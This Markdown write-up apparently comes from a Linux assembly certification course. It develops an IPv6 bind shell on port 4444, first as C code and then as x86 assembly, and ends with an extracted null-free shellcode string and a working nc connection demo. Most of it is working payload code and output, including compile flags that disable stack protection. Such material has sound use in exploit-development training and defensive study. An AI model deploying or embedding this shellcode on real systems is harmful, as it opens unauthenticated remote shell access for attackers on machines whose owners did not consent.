# Note

This MD file has been created for the SecurityTube Linux Assembly Expert certification (https://www.pentesteracademy.com/course?id=3). Student ID: 1483.

# IPv6

Let's try to change the code in order to listen on all IPv6 interfaces.

In order to better understand IPv6 structure, let's change the C code:

```C
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>

int main()
{
	int my_socket = socket(AF_INET6, SOCK_STREAM, 0);

	struct sockaddr_in6 my_sockaddr;
	my_sockaddr.sin6_family = AF_INET6;
    	my_sockaddr.sin6_addr = in6addr_any;
    	my_sockaddr.sin6_port = htons(4444);
	bind(my_socket, (struct sockaddr *)&my_sockaddr, sizeof(my_sockaddr));

	listen(my_socket, 0);

	int my_accept = accept(my_socket, NULL, NULL);

	int i;
	for(i = 0; i < 3; i++)
		dup2(my_accept, i);

	execve("/bin/sh", NULL, NULL);

	return 0;
}
```
Let's compile and run the program in order to check it.

```
$ gcc bind_shell_ipv6.c -o C-bind6
$ ./C-bind6 
```

In another terminal:

```
$ netstat -laput |grep "4444"
tcp6       0      0 [::]:4444               [::]:*                  LISTEN      6358/C-bind6
$ nc ::1 4444
id
uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
exit
```

# ASM

Changes in the previous code are:
 * using a *sockaddr_in6* structure
 * using AF_INET6
 * using *in6addr_any*

##  *sockaddr_in6* structure

Using the manual, *sockaddr_in6* structure is easy to understand:

```
   Address format
           struct sockaddr_in6 {
               sa_family_t     sin6_family;   /* AF_INET6 */
               in_port_t       sin6_port;     /* port number */
               uint32_t        sin6_flowinfo; /* IPv6 flow information */
               struct in6_addr sin6_addr;     /* IPv6 address */
               uint32_t        sin6_scope_id; /* Scope ID (new in 2.4) */
           };
```

Regarding the previous shellcode, the length of *sin6_addr* is different (this will be handled later) and *sin6_flowinfo* must be pushed. This field was not used in the C code, let's fill it with null bytes. A *uint32_t* variable has the size of a register, so a null register will be pushed.

The size of *sockaddr_in6* is easy to get using C code:
```C
$ cat sizeof.c
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>

int main()
{
	int my_socket = socket(AF_INET6, SOCK_STREAM, 0);

	struct sockaddr_in6 my_sockaddr;
	my_sockaddr.sin6_family = AF_INET6;
    	my_sockaddr.sin6_addr = in6addr_any;
    	my_sockaddr.sin6_port = htons(4444);

	printf("%i\n", sizeof(my_sockaddr));

	return 0;
}
$ gcc sizeof.c -o sizeof
$ ./sizeof 
28
```

In IPv4 previous shellcode 0xa will be replace by 0x1c:

```
push 0x1c ;previously push 0xa
```

## AF_INET6

AF_INET6 value is easy to find:
```
$ for elmt in $(locate socket.h); do grep AF_INET6 $elmt; done
#define AF_INET6	10	/* IP version 6			*/
```
In IPv4 previous shellcode 0x2 will be replaced by 0xa:

```
push word 0xa ;previously push word bx
```

## *in6addr_any*

*in6addr_any* value is easy to find:

```
$ for elmt in $(locate in.h); do grep -i IN6ADDR_ANY $elmt; done
extern const struct in6_addr in6addr_any;        /* :: */
#define IN6ADDR_ANY_INIT { { { 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 } } }
```

We will need to push a null register four times.

## Final shellcode

```ASM
global _start

section .text

_start:
	; socketcall
	xor eax, eax
	mov al, 0x66
	xor ebx, ebx
	mov bl, 1

	xor ecx, ecx
	push ecx
	push ebx
	push 0xa
	mov ecx, esp
	int 0x80

	mov edi, eax

	;bind
	xor eax, eax
	push eax
	push eax
	push eax
	push eax
	push eax
	push word 0x5c11
	push word 0xa
	mov edx, esp

	mov al, 0x66
	inc ebx
	push 0x1c
	push edx
	push edi
	mov ecx, esp

	int 0x80


	;listen
	xor eax, eax
	mov al, 0x66
	mov bl, 4
	push eax
	push edi
	mov ecx, esp
	int 0x80

	;accept
	mov al, 0x66
	inc ebx
	xor ecx, ecx
	push ecx
	push ecx
	push edi
	mov ecx, esp
	int 0x80

	xchg   ebx,eax
	
	;dup2 for loop
	xor ecx, ecx
	mov cl, 2

duploop:
	mov al, 0x3f	
	int 0x80
	dec ecx
	jns duploop	

	;execve
	mov al, 0xb
	xor ecx, ecx
	push ecx,
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp
	cdq
	int 0x80
```

## Compilation


Let's compile everything:

```
$ bash compile.sh bind_shellcode_ipv6
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
$ bash get-shellcode.sh bind_shellcode_ipv6
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x0a\x89\xe1\xcd\x80\x89\xc7\x31\xc0\x50\x50\x50\x50\x50\x66\x68\x11\x5c\x66\x6a\x0a\x89\xe2\xb0\x66\x43\x6a\x1c\x52\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\xb3\x04\x50\x57\x89\xe1\xcd\x80\xb0\x66\x43\x31\xc9\x51\x51\x57\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\xcd\x80"
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$ ./shellcode 
Shellcode Length:  103
```

And check if everything is working in another terminal:
```
$ netstat -laput |grep 4444
tcp6       0      0 [::]:4444               [::]:*                  LISTEN      9469/shellcode  
$ nc ::1 4444
id
uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
exit
```

As for the IPv4 shellcode, a Python script could be done in order to automate the port configuration.
